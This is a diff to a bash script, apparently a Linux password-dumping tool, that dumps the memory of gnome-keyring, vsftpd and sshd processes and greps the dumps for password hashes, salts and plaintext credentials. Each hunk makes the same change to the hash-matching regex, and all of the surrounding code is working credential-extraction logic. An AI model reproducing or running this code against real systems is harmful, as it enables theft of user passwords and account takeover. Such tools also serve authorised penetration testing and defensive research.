@@ -110,7 +110,7 @@ if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
 	if [[ $PID ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/dump "kali"
-			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
+			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP="$(strings "/tmp/dump.${pid}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
 			DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
@@ -135,7 +135,7 @@ if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
 	if [[ $PID ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/dump
-			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
+			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/dump.${pid}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
 			DUMP+=$(strings "/tmp/dump.${pid}" | egrep -A 5 -B 5 'libgcrypt\.so\..+$')
@@ -157,7 +157,7 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
 	if [[ $PID ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/vsftpd
-			HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
+			HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
 			#Remove dupes to speed up processing
@@ -206,7 +206,7 @@ if [[ -e "/etc/ssh/sshd_config" ]]; then
 	if [[ "$PID" ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/sshd
-			HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+$')"
+			HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/sshd.${pid}" | egrep -A 3 '^sudo.+')
 			#Remove dupes to speed up processing
